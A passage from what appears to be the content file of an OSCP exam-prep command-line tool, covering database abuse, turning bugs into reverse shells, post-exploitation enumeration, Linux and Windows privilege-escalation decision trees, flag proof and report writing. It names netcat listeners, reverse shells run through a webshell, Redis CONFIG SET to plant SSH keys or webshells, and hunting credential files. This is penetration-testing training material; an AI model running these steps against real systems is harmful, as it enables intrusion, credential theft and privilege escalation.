    redis-cli -h $TARGET                 # often no auth
    # INFO; KEYS *; CONFIG GET dir  -> abuse: write an SSH key or webshell via CONFIG SET dir/dbfilename
    oscp manual show redis-exploitation

## MongoDB (27017)
    mongo mongodb://$TARGET             # show dbs; use <db>; db.<col>.find()   (oscp atlas mongo)
    oscp manual show nosql-injection    # when it's behind a web API

## Pattern
"Connect (default/found creds) -> dump users/secrets -> reuse creds -> escalate to file-write/exec
(OUTFILE, xp_cmdshell, COPY PROGRAM, CONFIG SET)." (See: sqli-to-rce, mssql-abuse, database-enum.)

methods.title: Turning a bug into a shell
methods.brief: From webshell/command-exec to a stable reverse shell you control
methods.body:
## The goal
Convert whatever primitive you have (file upload, command injection, SQLi->OUTFILE, admin panel) into
an **interactive reverse shell** on your listener.

## 1. Start the listener first
    oscp hacktools listener 4444           # nc -lvnp 4444 (and rlwrap/pwncat options)
    # or:  nc -lvnp 4444

## 2. Pick a reverse shell for the target
    oscp hacktools revshell $LHOST 4444    # bash/python/php/perl/powershell variants, LHOST filled
Choose the language the box actually has (php on a PHP app, powershell on Windows). If you only have a
**webshell**, run the revshell command *through* it (`?cmd=<revshell>`), URL-encoding as needed.

## 3. Special cases
- **Windows**: `oscp hacktools windows $LHOST 4444` / a powershell one-liner; `oscp hacktools msfvenom`
  for an .exe if you can upload+run.
- **Egress filtered**: try common ports (443, 53), or a bind shell, or pivot (`oscp show pivot`).
- **Encoding**: wrap tricky payloads with `oscp hacktools encode` (base64) and decode on target.

## 4. Catch it, then stabilise
    oscp methods show shell-tty            # upgrade to a real TTY immediately

## Pattern
"listener up -> pick the right-language revshell (hacktools) -> fire it through the bug -> stabilise."
A shell you can't type in properly costs you more time than getting it. (See: reverse-and-bind-shells,
shell-tty.)

methods.title: The first 10 minutes on a new box
methods.brief: What to run and read the moment you land, before trying any privesc
methods.body:
## 1. Orient (who/where/what am I)
    oscp methods show shell-context        # id, whoami, hostname, $0, sudo -l
    id ; whoami ; hostname ; ip a ; sudo -l 2>/dev/null
Grab the first flag now if reachable: `cat /home/*/user.txt` / `type C:\Users\*\Desktop\local.txt`.

## 2. Run the automated enumerator (while you read manually)
    # Linux:
    oscp atlas pspy          # watch for root cron/processes
    ./linpeas.sh | tee linpeas.out        # transfer it first: oscp hacktools transfer / oscp show transfer
    oscp manual show peass-reading        # how to read the output (don't drown in it)
    # Windows:
    .\winPEAS.exe  (or PowerUp.ps1 / Seatbelt.exe)

## 3. Work the manual checklist in parallel
    oscp manual show linux-enum-checklist      # or windows-privesc-checklist
Key reads: `sudo -l`, SUID (`find / -perm -4000 2>/dev/null`), cron, writable files, running
services/ports (`ss -tlnp`), `/etc/passwd`, config files with creds.

## 4. Hunt credentials & reuse them
    oscp manual show creds-hunting
History files, configs (.env, wp-config, web.config), DBs, backups, SSH keys, `.bash_history`,
`/var/mail`. **Every credential gets tried on every service/user** (password reuse wins boxes).

## 5. Note internal reach (for later pivot)
    ss -tlnp ; arp -a ; cat /etc/hosts     # services bound to localhost = privesc or pivot targets
    oscp show pivot

## Pattern
"Orient -> automated (linpeas/winpeas) + manual checklist in parallel -> hunt & reuse creds -> note
localhost services." Enumeration here *is* the privesc. (See: linux-enum-checklist, creds-hunting.)

methods.title: Linux privesc — the decision tree
methods.brief: Map each enumeration finding to the exact technique and oscp command
methods.body:
## Run the checks, then branch on what you find
    oscp manual show linux-enum-checklist      # the full enum pass (linpeas covers most)

## Finding -> technique
| You found | Do this |
| --- | --- |
| `sudo -l` shows a binary | `oscp methods show gtfobins-logic` · `oscp gtfo <binary>` |
| sudo version is old | `oscp manual show sudo-known-cves` (Baron Samedit, -u#-1) |
| SUID binary (`find / -perm -4000`) | `oscp gtfo <binary>` · `oscp manual show suid-concept` |
| a capability (`getcap -r /`) | `oscp manual show capabilities-deepdive` |
| writable /etc/passwd or /etc/shadow | `oscp manual show writable-passwd-shadow-privesc` |
| member of `docker` / `lxd` group | `oscp manual show docker-socket-privesc` · `lxd-lxc-privesc` |
| a root cron / writable script | `oscp manual show cron-scheduling` · `writable-cron-walkthrough` |
| a root process calling a relative bin | `oscp manual show path-env-hijacking` |
| a root job with `*` in a writable dir | `oscp manual show wildcard-injection-privesc` |
| NFS `no_root_squash` | `oscp manual show nfs-no-root-squash` |
| kernel looks old | `oscp manual show kernel-exploits` (last resort) |
| creds in history/config | reuse them: `su <user>` / ssh (`oscp manual show creds-hunting`) |

## The order to try
1. `sudo -l` (fastest, cleanest win) -> 2. cron/writable scripts -> 3. SUID/capabilities ->
4. group abuse (docker/lxd) -> 5. writable sensitive files -> 6. service/path/wildcard ->
7. kernel exploit **only** when the rest is exhausted (can crash the box).

## Pattern
"Enumerate -> match the finding to its technique above -> try the clean wins before kernel exploits."
Most Linux roots are `sudo -l` + GTFOBins or a cron/SUID misconfig. (See: gtfobins-logic, suid-concept,
sudoers-logic.)

methods.title: Windows privesc — the decision tree
methods.brief: Map winPEAS findings to the technique and oscp command
methods.body:
## Run the checks, then branch
    oscp manual show windows-privesc-checklist     # whoami /priv, /groups, winPEAS passes

## Finding -> technique
| You found | Do this |
| --- | --- |
| `SeImpersonatePrivilege` (service acct, IIS/MSSQL) | `oscp manual show windows-potato-attacks` |
| `SeBackup/SeRestore/SeDebug/SeTakeOwnership` | `oscp manual show windows-token-privesc` |
| unquoted service path | `oscp manual show unquoted-service-path` |
| weak service perms / writable service binary | `oscp manual show windows-service-privesc` |
| a writable scheduled task | `oscp manual show windows-scheduled-tasks` |
| AlwaysInstallElevated / autoruns | `oscp manual show windows-autoruns-registry` |
| GPP cpassword / unattend / saved creds | `oscp manual show windows-gpp-laps` · `browser-and-vault-creds` |
| a missing DLL in a writable path | `oscp manual show windows-dll-hijacking` |
| old build + a matched CVE | `oscp manual show kernel-exploits` (wesng) |

## In a domain (AD)? different game
    oscp show ad
    oscp manual show ad-killchain          # map -> roast -> move -> DA
    oscp methods show attack-rdp-winrm     # use creds/hashes to move
Roasting, delegation, ACL abuse: `oscp manual show kerberoasting-deep` · `asreproasting` ·
`adcs-esc-attacks` · `ad-acl-abuse`.

## Pattern
"whoami /priv first (SeImpersonate = near-instant SYSTEM) -> then services/tasks/registry/creds ->
DLL -> kernel last. In AD, pivot to the domain kill chain." (See: windows-potato-attacks,
windows-privesc-checklist.)

methods.title: Flags, proof files & submission
methods.brief: Where the flags are, how to prove each one, and not losing earned points
methods.body:
## Where the flags live
- **Linux**: `/home/<user>/user.txt` (or `local.txt`) and `/root/proof.txt` (or `root.txt`).
- **Windows**: `C:\Users\<user>\Desktop\local.txt` and `C:\Users\Administrator\Desktop\proof.txt`.
      cat /root/proof.txt            type C:\Users\Administrator\Desktop\proof.txt

## Prove it properly (or you lose the points)
Capture the flag **together with evidence of who/where you are**, in one screenshot:
    # Linux
    whoami ; hostname ; ip addr | grep inet ; cat /root/proof.txt
    # Windows
    whoami & hostname & ipconfig & type C:\Users\Administrator\Desktop\proof.txt
The screenshot must show the **command, its output, your IP, and the flag** in the same frame. A bare
flag string with no context may not be accepted.

## Workflow discipline
1. **Screenshot the instant** you get each shell and each flag — don't "come back to it".
2. Copy each proof hash into your notes **with the target IP** immediately.
3. Record the **exact steps** as you go — you must reproduce them in the report; you can't re-pwn from
   memory at 2am.

## Submitting (exam)
Paste the proof hashes into the exam control panel's submission boxes as you get them (they're how
points are tracked). Read your exam guide for the exact process and which machines award what.

## Pattern
"Flag + whoami + ip in one screenshot -> hash into notes with the IP -> record steps now -> submit in
the panel." (See: oscp-exam-strategy, note-taking-reporting in `oscp manual`, report-writing.)

methods.title: Writing the OSCP report
methods.brief: Structure, per-machine walkthroughs, and making every step reproducible
methods.body:
## Why the report is half the exam
You get ~24 hours after hacking to document it. **Points come from the report, not the shell** — an
unreported root scores zero. Write it so an assessor can **reproduce every step** from your words and
screenshots alone.

## Use the official template
Start from the **Offensive Security report template** (.docx/.md). Don't invent a format. Typical
sections:
1. **Title / contact / confidentiality**.
2. **Executive summary** — plain-language outcome.
3. **(If required) course exercise & lab documentation** — for bonus points, if you opted in.
4. **Per-machine walkthrough** — one section each (the bulk of the marks).
5. **Appendices** — long outputs, custom scripts.

## Per-machine section (the pattern that scores)
For each target, in order:
- **Target IP + which flags you got** (local/proof hashes).
- **Enumeration** — the nmap output and what stood out.
- **Exploitation** — the exact vuln, the **exact commands** (copy-paste-able), and the payload.
  Modified a public exploit? include the changes and the source.
- **Proof** — the `whoami`+`ip`+flag screenshot.
- **Privilege escalation** — the finding, the technique, the commands, the proof screenshot.
Each claim = a command + its screenshot. "I got root" without the reproducible steps = no points.

## Capture as you go (not after)
- Screenshot every shell/flag **when it happens**; name files by IP.
- Keep a running command log per host (`script`/`tee`, or `oscp` copy-to-clipboard into your notes).
- `oscp manual show note-taking-reporting` for a note structure.

## Do / don't
- **Do**: number steps, show commands *and* output, state the IP in each screenshot, redact nothing
  that proves the step.
- **Don't**: rely on memory, paste a flag with no context, skip privesc reproduction, or submit a
  machine you can't reproduce.

## Deliver
Export to **PDF**, name it per the exam's required filename, zip if asked, and submit before the
deadline. Submit **early** — upload issues at the buzzer cost people their pass.

## Pattern
"Official template -> per-machine: enum + exact commands + proof screenshot + privesc, all
reproducible -> capture as you go -> PDF and submit early." (See: oscp-exam-strategy, flags-and-proof,
note-taking-reporting.)
